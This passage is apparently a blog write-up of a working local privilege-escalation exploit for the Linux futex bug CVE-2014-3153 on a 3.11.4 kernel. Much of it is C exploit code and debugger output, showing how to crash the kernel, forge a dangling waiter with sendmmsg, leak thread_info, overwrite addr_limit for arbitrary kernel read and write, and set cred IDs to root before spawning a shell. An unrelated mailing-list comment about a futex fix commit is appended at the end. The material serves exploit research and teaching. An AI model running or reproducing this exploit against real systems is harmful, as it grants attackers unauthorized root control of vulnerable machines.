Now, the waiter entry points to garbage kernel stack memory. The original `rt_waiter` is long gone and was destroyed by other function calls on the stack.

![Bugged Waiter Image](https://i.imgur.com/Dael9DR.png)

Our waiter, a node in the waiters list, is now completely corrupted.

# Building The Kernel

I won’t go too in depth as to how I built the kernel, since there are a milion of tutorials out there on how to do that.
I’d merely state that I’ve been using an 3.11.4-i386 kernel for this exploit that I compiled on a Xenial (Ubuntu 16.04) Docker container.

The only actual hassle was getting my hands on the right `gcc` version for the according kernel version that I worked on.
I compared the [GCC releases](https://gcc.gnu.org/releases.html) with the [Linux kernel version](https://en.wikipedia.org/wiki/Linux_kernel_version_history) history and tried various versions that seemed to fit by release date.
Ultimately `gcc-5` was what did the job for me.

It would be virtually impossible to do all of that without building your own kernel.

The ability to debug the code and add your own logs within the code is indescribable.

For actually running the kernel, I’ve used QEMU as my emulator.

# Exploitation

Now’s the time for the actual fun.

Eventually, our goal would be to escalate to `root` privileges.

The way we’d do that is by achieving arbitrary read & write within the kernel’s memory,
and then overwrite our process’ [`cred`](https://elixir.bootlin.com/linux/v3.11.4/source/include/linux/cred.h#L102) struct which dictates the security context of a task.

```
struct cred {
	atomic_t	usage;
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
	unsigned	securebits;	/* SUID-less security management */
	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
	kernel_cap_t	cap_permitted;	/* caps we're permitted */
	kernel_cap_t	cap_effective;	/* caps we can actually use */
	kernel_cap_t	cap_bset;	/* capability bounding set */
	kernel_cap_t	cap_ambient;	/* Ambient capability set */
	...
}

```

The most fundamental members of `cred` are presumably the real `uid` and `gid`,
but it also stores other properties such as the task’s [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html) and many other.

Although how would we go about it by solely having a wild reference to that waiter?

Quite frankly, the idea is fairly simple. There’s nothing new about corrupting a node within a linked list in order to gain read and write capabilities.
Same applies here. We’d need to find a way to write to that dangling waiter,
and then perform certain operations on it so that the kernel would do as we please.

#### Kernel Crash

But let’s start small. For now we’ll just attempt to crash the kernel.

I wrote a program that implements the steps that we listed above.

Let’s analyze it before going into the actual exploitation.
Here’s the [code](https://github.com/elongl/CVE-2014-3153/blob/master/kernel_crash.c).

```
#define CRASH_SEC 3

int main()
{
    pid_t pid;
    uint32_t *futexes;
    uint32_t *non_pi_futex, *pi_futex;

    assert((futexes = mmap(NULL, sizeof(uint32_t) * 2, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0)) > 0);

    non_pi_futex = &futexes[0];
    pi_futex = &futexes[1];

    flock(pi_futex);

    assert((pid = fork()) != -1);
    if (!pid)
    {
        fwait_requeue(non_pi_futex, pi_futex, 0);
        puts("Child continues.");
        exit(EXIT_SUCCESS);
    }

    printf("Kernel will crash in %u seconds...\n", CRASH_SEC);
    sleep(CRASH_SEC);

    frequeue(non_pi_futex, pi_futex, 1, 0);
    *pi_futex = 0;
    frequeue(pi_futex, pi_futex, 1, 0);

    wait(NULL);
}

```

The `flock`, `fwait_requeue`, and the `frequeue` functions are implemented in a small [futex wrappers](https://github.com/elongl/CVE-2014-3153/blob/master/futex.c) file that I’ve created for simplification and ease on the eyes.

```
futexes = mmap(NULL, sizeof(uint32_t) * 2, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0)

```

We start off by allocating `sizeof(uint32_t) * 2` of R/W memory which is our two futexes.

Mind the `MAP_SHARED` flag that is being passed to `mmap` call in order to signal that the memory
needs to be shared among the main process and the process that is spawned from the `fork()` call.

*Side-comment*: In the actual exploit you’d see that I’m using `pthreads` rather than `fork()` which makes the code much clearer,
and there’s no need to map a shared address space since all threads point to the same virtual address space.

1. Locking the `pi_futex`.

   ```
   flock(pi_futex)

   ```
2. Spawn a child process and call `FUTEX_WAIT_REQUEUE_PI` from `non_pi_futex` to `pi_futex`.

   ```
   assert((pid = fork()) != -1);
   	if (!pid)
   	{
   		fwait_requeue(non_pi_futex, pi_futex, 0);
   		puts("Child continues.");
   		exit(EXIT_SUCCESS);
   	}

   ```
3. We only `sleep` to assure that the `fwait_requeue` of the child process had already been issued.
   Afterwards, we requeue the waiter to the `pi_futex`.

   ```
   ```c
   sleep(CRASH_SEC);
   frequeue(non_pi_futex, pi_futex, 1, 0);
   ```

   ```
4. Overwrite the userspace value of the `pi_futex` to `0`.

   ```
   *pi_futex = 0;

   ```
5. Self-requeue.

   ```
   frequeue(pi_futex, pi_futex, 1, 0);

   ```

Now let’s see this in action.

If you paid attention to the call trace,
you would spot that the kernel crashes once the process itself terminates (`do_exit`).
What happens is that the kernel attempts to cleanup the process’ resources (`mm_release`), specifically the PI state list (`exit_pi_state_list`),
and when it attempts to do so, it unlocks all the futexes that the process holds.
During the process of releasing them, the kernel tries to unlock our corrupted waiter as well which causes a crash.

To be more accurate, it occurs here.

```
static inline struct rt_mutex_waiter *
rt_mutex_top_waiter(struct rt_mutex *lock)
{
	struct rt_mutex_waiter *w;

	w = plist_first_entry(&lock->wait_list, struct rt_mutex_waiter,
			       list_entry);
	BUG_ON(w->lock != lock); // <-- KERNEL BUG

	return w;
}

```

The function compares the lock that the top waiter claims it waits on to the actual lock.
Because the waiter is completely bugged,
it’s `lock` member no longer points to the relating `rt_mutex` and therefore causes a crash.

# Privilege Escalation

DOSing the system is pretty cool, but let’s make it more interesting by escalating to `root` privileges.

I intentionally do not post the entire exploit in advance because that would most likely be too overwhelming.
Instead, I’ll append code blocks by stages.

If you do prefer to have the entire exploit available in hand, it can be found [here](https://github.com/elongl/CVE-2014-3153/blob/master/privilege_escalation.c).

#### Writing To The Waiter

In order to make use of our dangling waiter, we’d first need to find a way to write to it.

A quick reminder, our waiter is placed on the kernel stack.
With that in mind, we need to somehow be able to write a controlled buffer to the place the waiter was held within the stack.
Given that we’re just a userspace program, our way of writing data to the kernel’s stack is by issuing System Calls.

But how do we know which syscall to invoke?

Luckily for us, the kernel comes with a useful tool called `checkstack`.

It can be found within the source under `scripts/checkstack.pl`.

```
$ objdump -d vmlinux | ./scripts/checkstack.pl i386 | grep -E "(futex_wait_requeue_pi|sys)"

0xc11206e6 do_sys_poll [vmlinux]:                       932
0xc1120aa3 do_sys_poll [vmlinux]:                       932
...
0xc1527388 ___sys_sendmsg [vmlinux]:                    248
0xc15274d8 ___sys_sendmsg [vmlinux]:                    248
0xc1527b1a ___sys_recvmsg [vmlinux]:                    220
0xc1527c6b ___sys_recvmsg [vmlinux]:                    220
0xc1087936 futex_wait_requeue_pi.constprop.21 [vmlinux]:212
0xc1087a80 futex_wait_requeue_pi.constprop.21 [vmlinux]:212
0xc1529828 __sys_sendmmsg [vmlinux]:                    184
0xc15298fe __sys_sendmmsg [vmlinux]:                    184
...

```

The script lists the stack depth, size of stack frame, of each function within the kernel.
This would help us in estimating which syscall we should use in order to write to the waiter’s address space.

We enforce two limitations on the system call we’re looking for.

1. It is deep enough in order to overlap with our dangling `rt_waiter`.
2. The local variable within the function that overlaps `rt_waiter` is controllable.

The syscalls `sendmsg`, `recvmsg`, and `sendmmsg` are the adjacent functions to `futex_wait_requeue_pi` in terms of stack usage.

That should be a good place to start.
We’ll be using `sendmmsg` throughout the exploit.

```
Breakpoint 1, futex_wait_requeue_pi (uaddr=uaddr@entry=0x80ff44c, flags=flags@entry=0x1, val=val@entry=0x0,

(gdb) p sizeof(iovstack)
$13 = 0x40

(gdb) p &iovstack < $waiter < (char*)&iovstack + sizeof(iovstack)
$14 = 0x1 (True)

```

I set two breakpoints, at [`futex_wait_requeue_pi()`](https://elixir.bootlin.com/linux/v3.11.4/source/kernel/futex.c#L2285) and [`___sys_sendmsg()`](https://elixir.bootlin.com/linux/v3.11.4/source/net/socket.c#L1976) in order to understand what arguments should we pass to the `sendmmsg` syscall
so that `rt_waiter` is under our control.

When the breakpoint hits on [`futex_wait_requeue_pi()`](https://elixir.bootlin.com/linux/v3.11.4/source/kernel/futex.c#L2285), I do nothing besides storing the address of `rt_waiter` in `$waiter`.
When it hits on [`___sys_sendmsg()`](https://elixir.bootlin.com/linux/v3.11.4/source/net/socket.c#L1976), I check for the address of the local variable `iovstack`, which is of type `struct iovec[8]`, and examine its size.

| **Variable** | **Address** |
| --- | --- |
| `rt_waiter` | `0xc78cbe2c` |
| `iovstack` | `0xc78cbe08` - `0xc78cbe48` |

Proved `futex_wait_requeue_pi:rt_waiter` overlaps with `___sys_sendmsg:iovstack`.

Let’s take a look at `sendmmsg`’s signature.

```
int sendmmsg(int sockfd, struct mmsghdr *msgvec, unsigned int vlen,
                    int flags);

struct mmsghdr
{
	struct msghdr msg_hdr;
	unsigned int msg_len;
};

struct msghdr
{
	void *msg_name;
	socklen_t msg_namelen;
	struct iovec *msg_iov; // <-- iovstack
	size_t msg_iovlen;
	void *msg_control;
	size_t msg_controllen;
	int msg_flags;
};

struct iovec
{
	void *iov_base;
	size_t iov_len;
};

```

At this point I suggest understanding the syscall itself.

> The sendmmsg() system call is an extension of sendmsg(2) that
> allows the caller to transmit multiple messages on a socket using
> a single system call. (This has performance benefits for some
> applications.)

The arguments are pretty trivial and essentially the same as `sendmsg` only that there’s `mmsghdr` that can contain multiple `msghdr`.

If you’re unfamiliar with the syscall, give it a read at [`man sendmmsg(2)`](https://man7.org/linux/man-pages/man2/sendmmsg.2.html).

In order to invoke `sendmmsg` successfully, we’d need a pair of connected sockets that we can send the data to.
It is very important to understand that we want [`___sys_sendmsg()`](https://elixir.bootlin.com/linux/v3.11.4/source/net/socket.c#L1976) to **block** so that we can take advantage of the waiter’s corrupted state while it’s under our control.

Typically, the function sends the data over the socket and exits.
In order to make it block, we’d need to use `SOCK_STREAM` as our socket type which provides a *reliable connection-based* byte stream.
This grants us the blocking capabilities we’ve talked about.
On top of that, we’d need to fill up the “send buffer” so that data can’t be sent over the socket, unless data is read on the other end.

I’ve crafted a function that does just that.

```
#define BLOCKBUF "AAAAAAAA"
#define BLOCKBUFLEN strlen(BLOCKBUF)

int client_sockfd, server_sockfd;

void setup_sockets()
{
    int fds[2];

    puts(USERLOG "Creating a pair of sockets for kernel stack modification using blocking I/O.");

    assert(!socketpair(AF_UNIX, SOCK_STREAM, 0, fds));

    client_sockfd = fds[0];
    server_sockfd = fds[1];

    while (send(client_sockfd, BLOCKBUF, BLOCKBUFLEN, MSG_DONTWAIT) != -1)
        ;
    assert(errno == EWOULDBLOCK);
}

```

The function creates a pair of UNIX sockets of type `SOCK_STREAM` and then
sends `AAAAAAAA` over the socket untill the call to `send` fails with `EWOULDBLOCK` as the `errno`.
Note the `MSG_DONTWAIT` flag that makes the `send` return immediately instead of blocking.

> MSG\_DONTWAIT
>
> Enables nonblocking operation; if the operation would block, EAGAIN or EWOULDBLOCK is returned.

Afterwards we assert that `EWOULDBLOCK` is in fact the reason the operation failed.

Next up, we’re ready for actually invoking our `sendmmsg` to overwrite `rt_waiter`. Exciting!

For the sake of overwriting the waiter’s list entries properly, which is what we’re interested in,
we’d need to align the `iovstack` in kernelspace, which is the `iovec` in userspace accordingly.

```
#define COUNT_OF(arr) (sizeof(arr) / sizeof(arr[0]))

struct mmsghdr msgvec;
struct iovec msg[7];

void setup_msgs()
{
    int i;

    for (i = 0; i < COUNT_OF(msg); i++)
    {
        msg[i].iov_base = 0x41414141;
        msg[i].iov_len = 0xace;
    }
    msgvec.msg_hdr.msg_iov = msg;
    msgvec.msg_hdr.msg_iovlen = COUNT_OF(msg);
}

```

In this function I setup the messages, the `iovec`, in the hope that it would overwrite the waiter’s struct once I call `sendmmsg`.
Once again, I’ve placed two breakpoints at [`futex_wait_requeue_pi()`](https://elixir.bootlin.com/linux/v3.11.4/source/kernel/futex.c#L2285) and [`___sys_sendmsg()`](https://elixir.bootlin.com/linux/v3.11.4/source/net/socket.c#L1976).

```

    },
    node_list = {
      next = 0x41414141,
      prev = 0xace
    }
    ...
}

```

There are many interesting things to look at from this experiment. Let’s go over it.

Just as before, I store `rt_waiter`’s address. Upon `___sys_sendmmsg` I continue the execution until the function is about to exit.
However, because the function is blocking, I have to interrupt the debugger with a `^C`.
Once the function blocks, it had already filled the `iovstack`.
After I do that, I browse the waiter struct and I see that the overwrite occured just as I wanted it to.

![Waiter Overwritten Image](https://i.imgur.com/npV3oAT.png)

(In reality there's only a single waiter)

That’s great! We can now overwrite the dangling waiter’s memory.

Let’s review this as a whole within the the exploit code.

```
void *forge_waiter(void *arg)
{
    puts(USERLOG "Placing the fake waiter on the dangling node within the mutex's waiters list.");

    setup_msgs();
    setup_sockets();
    assert(!fwait_requeue(&non_pi_futex, &pi_futex, 0));
    assert(!sendmmsg(client_sockfd, &msgvec, 1, 0));
}

int main()
{
    pthread_t forger, ref_holder;

    lock_pi_futex(NULL);

    assert(!pthread_create(&forger, NULL, forge_waiter, NULL));
    sleep(1);

    assert(frequeue(&non_pi_futex, &pi_futex, 1, 0) == 1);

    assert(!pthread_create(&ref_holder, NULL, lock_pi_futex, NULL));
    sleep(1);

    pi_futex = 0;
    frequeue(&pi_futex, &pi_futex, 1, 0);
    ...
}

```

We’ve already reviewed `setup_msg()`, `setup_sockets()`, and `fwait_requeue()` would block until the self-requeue is triggered.
First thing when it exits, `sendmmsg()` is called to overwrite the waiter, which also blocks.

You could see that I create another thread called `ref_holder` which also attempts to lock `pi_futex` which in turns forms another waiter instance.
The reason this is needed is because the state of the futex would get destroyed if there aren’t any contending waiters on the lock.

# Kernel Infoleak

Our next goal would be to leak an address that would help us target the [`task_struct`](https://elixir.bootlin.com/linux/v3.11.4/source/include/linux/sched.h#L1027) of our process which contains its [`cred`](https://elixir.bootlin.com/linux/v3.11.4/source/include/linux/cred.h#L102)
so that we can overwrite it later to gain `root` privileges.

The way we go about doing it is using a fake waiter and when we’d attempt to lock the futex once again,
another waiter would be added to the waiters list which would result in writing to the adjacent nodes which would be under our control.
Once that happens, we’d be able to inspect the kernel address from userspace via the fake waiter list nodes.

```
#define DEFAULT_PRIO 120
#define THREAD_INFO_BASE 0xffffe000

struct rt_mutex_waiter fake_waiter, leaker_waiter;
pthread_t corrupter;

void link_fake_leaker_waiters()
{
    fake_waiter.list_entry.node_list.prev = &leaker_waiter.list_entry.node_list;
    fake_waiter.list_entry.prio_list.prev = &leaker_waiter.list_entry.prio_list;
    fake_waiter.list_entry.prio = DEFAULT_PRIO + 1;
}

void leak_thread_info()
{
    link_fake_leaker_waiters();
    assert(!pthread_create(&corrupter, NULL, lock_pi_futex, NULL));

    sleep(1);
    corrupter_thread_info = (struct thread_info *)((unsigned int)leaker_waiter.list_entry.prio_list.next & THREAD_INFO_BASE);
    printf(USERLOG "Corrupter's thread_info @ %p\n", corrupter_thread_info);
}

```

Let’s first address what’s called a “Thread Info”.

[`thread_info`](https://elixir.bootlin.com/linux/v3.11.4/source/arch/x86/include/asm/thread_info.h#L25) is a thread descriptor that is held within the kernel and is placed on the stack’s address space.
For each thread that we create using `pthread_create()` a new [`thread_info`](https://elixir.bootlin.com/linux/v3.11.4/source/arch/x86/include/asm/thread_info.h#L25) is generated in the kernel.

```
struct thread_info {
	struct task_struct	*task;		/* main task structure */
	struct exec_domain	*exec_domain;	/* execution domain */
	__u32			flags;		/* low level flags */
	__u32			status;		/* thread synchronous flags */
	__u32			cpu;		/* current CPU */
	int			preempt_count;	/* 0 => preemptable,
						   <0 => BUG */
	mm_segment_t		addr_limit;
	struct restart_block    restart_block;
	void __user		*sysenter_return;
	unsigned int		sig_on_uaccess_error:1;
	unsigned int		uaccess_err:1;	/* uaccess failed */
};

```

The reason it interests us is because it’s relatively easy to get its address once you have a leak,
and the more interesting reason is that it contains a pointer to the process’ [`task_struct`](https://elixir.bootlin.com/linux/v3.11.4/source/include/linux/sched.h#L1027).
Just to clarify, a new [`task_struct`](https://elixir.bootlin.com/linux/v3.11.4/source/include/linux/sched.h#L1027) is also created for each thread.

In order to do the actual leak, we link together two fake waiters.
One is named `fake_waiter` which is used for general list corruption,
and the other is called `leaker_waiter` because its sole usage is to leak addresses through.

By linking I mean in practice that we set the previous node of the `fake_waiter` to be the `leaker_waiter`,
and set its priority to be the default priority of a task plus one so that it’ll place itself after the `leaker_waiter`.
Priority is a value that correlates to the process’ niceness.

![Crafted Waiter Image](https://i.imgur.com/5HtvkBq.png)

Those aren't the actual priorities but the idea remains.

After we’ve linked the waiters in userspace,
we call `lock_pi_futex()` on another thread so that a waiter is created which attempts to add itself into the list.
Naturally, once a node is added into a list, it writes to its adjacent nodes, in our case to `leaker_waiter`.

![New Waiter Image](https://i.imgur.com/uAJDaJF.png)

Awesome! We’ve leaked a kernel stack address of one of the threads in our program.

In order to target its [`thread_info`](https://elixir.bootlin.com/linux/v3.11.4/source/arch/x86/include/asm/thread_info.h#L25), all we have to do is AND its address with `THREAD_INFO_BASE`.
You can see that from [`current_thread_info()`](https://elixir.bootlin.com/linux/v3.11.4/source/arch/x86/include/asm/thread_info.h#L174)’s implementation, though that might vary across different architectures.
Here’s the source for x86.

```
/* how to get the thread information struct from C */
static inline struct thread_info *current_thread_info(void)
{
	return (struct thread_info *)
		(current_stack_pointer & ~(THREAD_SIZE - 1));
}

```

We have a hold of the `thread_info` location in memory.

# Overwriting Address Limit

Just as we can read by corrupting the list, we can utilize the same technique in order to use it for writing purposes.
The first memory area that we’ll be targeting is what’s called the “Address Limit”.

It lays under `thread_info.addr_limit` as you can see in [`thread_info`](https://elixir.bootlin.com/linux/v3.11.4/source/arch/x86/include/asm/thread_info.h#L25) above.
It is used for limiting the virtual address space that is reserved for the user.
When the kernel works with user-provided addresses,
it compares them to the thread’s `addr_limit` in order to verify that it’s a valid userspace address.
If the supplied address is smaller than `addr_limit`, the designated memory area is in fact from userspace.

The `addr_limit` is an excellent target for initial kernel overwrite because once you overwrite it with `0xffffffff`,
you have gotten full arbitrary read and write capabilities to kernel memory.

```
void kmemcpy(void *src, void *dst, size_t len)
{
    int pipefd[2];

    assert(!pipe(pipefd));
    assert(write(pipefd[1], src, len) == len);
    assert(read(pipefd[0], dst, len) == len);
}

void escalate_priv_sighandler()
{
    struct task_struct *corrupter_task, *main_task;

    printf(USERLOG "Written 0x%x to addr_limit.\n", -1);

    printf(USERLOG "Main thread's cred @ %p\n", main_cred);

    for (i = 0; i < COUNT_OF(main_cred->ids); i++)
        kmemcpy(&root_id, &main_cred->ids[i], sizeof(root_id));

    puts(USERLOG "Escalated privileges to root successfully.");
}

void escalate_priv()
{
    pthread_t addr_limit_writer;

    struct sigaction sigact = {.sa_handler = escalate_priv_sighandler};
    assert(!sigaction(SIGINT, &sigact, NULL));
    puts(USERLOG "Registered the privileges escalator signal handler for interrupting the corrupter thread.");

    fake_waiter.list_entry.prio_list.prev = (struct list_head *)&corrupter_thread_info->addr_limit;
    assert(!pthread_create(&addr_limit_writer, NULL, lock_pi_futex, NULL));

    sleep(1);
    pthread_kill(corrupter, SIGINT);
}

```

After we’ve executed [`leak_thread_info()`](https://github.com/elongl/CVE-2014-3153/blob/master/privilege_escalation.c#L138), we’re going to call [`escalate_priv()`](https://github.com/elongl/CVE-2014-3153/blob/master/privilege_escalation.c#L123).
The first thing that it does is register [`escalate_priv_sighandler`](https://github.com/elongl/CVE-2014-3153/blob/master/privilege_escalation.c#L95) as the `SIGINT` signal handler using the [`sigaction()`](https://man7.org/linux/man-pages/man2/sigaction.2.html) syscall.

Let’s briefly mention what signal handlers are and why do we use them.
A signal handler is a function that is called by the target environment when the corresponding signal occurs.
The target environment **suspends execution** of the program until the signal handler returns.

This mechanism allows us to **interrupt** the process’ job in order to perform some other work.
In our case, we’d like to form the kernel stack in a certain way and also be able to execute a piece of code on the same thread.
However, in order to arrange the stack we have to perform a blocking operation because otherwise our arrangement would be overwritten,
but if you block you can’t exploit the stack’s state.

That’s why signal are needed and why they’re used in our scenario.
They allow us to execute code within the process’ context **outside its normal execution flow**.

I’m reminding you that when talking about `pthreads`, all the signal handlers are shared with the parent process,
that is because internally `pthreads` passes both `CLONE_THREAD | CLONE_SIGHAND` flags when it creates the child process with [`clone()`](https://man7.org/linux/man-pages/man2/clone.2.html).

> CLONE\_THREAD
>
> The flags mask must also include CLONE\_SIGHAND if CLONE\_THREAD is specified.

Afterwards, we’re going to place the address that we want to write to, that is `&corrupter_thread_info->addr_limit`, as the fake waiter’s previous node.
Once we’ll attempt to lock the futex, the newly created waiter would write its own address to the `addr_limit`.
Not yet something that we can control,
but rather a value that is guaranteed to be bigger than the current one because `addr_limit` is at the bottom-most of the virtual address space.

Now we’ve arrived to a scenario where `addr_limit > &addr_limit` is surely true.
Once this is condition is met, we can simply write to `addr_lmit` once again on our own!
This is where the signaling come into play, and specifically the [`escalate_priv_sighandler`](https://github.com/elongl/CVE-2014-3153/blob/master/privilege_escalation.c#L95) from earlier.

Because each thread has its own [`thread_info`](https://elixir.bootlin.com/linux/v3.11.4/source/arch/x86/include/asm/thread_info.h#L25), which in turn means that each thread also has its own `addr_limit`,
we’d need a way to interrupt the *specific* thread whose `addr_limit` we’ve overwritten.
Therefore, after we’ve “increased” the address limit, only that thread would be able to utilize and exploit this feature.
This is where we signal the `addr_limit_writer` thread using `pthread_kill()` which triggers the execution of [`escalate_priv_sighandler`](https://github.com/elongl/CVE-2014-3153/blob/master/privilege_escalation.c#L95).

What this function does is read and write to different areas in kernel memory.
In order to do it, I wrote a small helper function called [`kmemcpy()`](https://github.com/elongl/CVE-2014-3153/blob/master/privilege_escalation.c#L40).
It exploits the fact that `addr_limit` had been overwritten, it creates a pipe which it reads from and writes to.
The `read()` and `write()` syscalls internally invoke `copy_from_user()` and `copy_to_user()` within the kernel which do the checks according to `addr_limit`.

```
unsigned long
_copy_from_user(void *to, const void __user *from, unsigned long n)
{
	if (access_ok(VERIFY_READ, from, n)) // <-- addr_limit comparison
		n = __copy_from_user(to, from, n);
	else
		memset(to, 0, n);
	return n;
}

unsigned long
copy_to_user(void __user *to, const void *from, unsigned long n)
{
	if (access_ok(VERIFY_WRITE, to, n)) // <-- addr_limit comparison
		n = __copy_to_user(to, from, n);
	return n;
}

#define access_ok(type, addr, size) \
	(likely(__range_not_ok(addr, size, user_addr_max()) == 0))

#define user_addr_max() (current_thread_info()->addr_limit.seg)

```

At the signal handler several operations are done.

1. Cancel the address space access limitation by setting `addr_limit` to the highest value possible.
2. Read the [`task_struct`](https://elixir.bootlin.com/linux/v3.11.4/source/include/linux/sched.h#L1027) pointer of the corrupted thread.
3. Read the parent’s [`task_struct`](https://elixir.bootlin.com/linux/v3.11.4/source/include/linux/sched.h#L1027) pointer from the corrupted thread’s [`task_struct`](https://elixir.bootlin.com/linux/v3.11.4/source/include/linux/sched.h#L1027) via the `group_leader` member which points to it.
4. Read the [`cred`](https://elixir.bootlin.com/linux/v3.11.4/source/include/linux/cred.h#L102) struct pointer from the parent’s [`task_struct`](https://elixir.bootlin.com/linux/v3.11.4/source/include/linux/sched.h#L1027).
5. Overwrite all the identifiers (uid, gid, suid, sgid, etc.) of the main [`cred`](https://elixir.bootlin.com/linux/v3.11.4/source/include/linux/cred.h#L102) struct.

# Popping Shell

Now all that’s left to do is `system("/bin/sh")` on the main thread to drop a shell.

Because the child process inherits the [`cred`](https://elixir.bootlin.com/linux/v3.11.4/source/include/linux/cred.h#L102) struct, the shell will also be in `root` permissions.

# Concluding

This has been a lot of fun, and I’ve learned so much on the way.

I got to have the interaction I desired with the kernel, working with it and understanding how it works a bit better.
Needless to say, there’s an infinite amount of knowledge to be gathered, but that’s a small step onwards.
At the end, the [exploit](https://github.com/elongl/CVE-2014-3153/blob/master/privilege_escalation.c) seems relatively short, but the truly important part is getting there and being able to solve the puzzle.

The full repository can be found [here](https://github.com/elongl/CVE-2014-3153).

If you have any questions, feel free to contact me and I’ll gladly answer.

Hope you enjoyed the read. Thanks!

Special thanks to Nspace who helped throughout the process.

Hi,

I'm not familiar with futexes, but just to save others a few minutes on
looking this up:

FWIW, this commit has:

Fixes: 1b7558e457ed ("futexes: fix fault handling in futex_lock_pi")

and that other commit is from 2008.  So probably all currently
maintained Linux distros and deployments are affected, unless something
else mitigated the issue in some kernel versions.
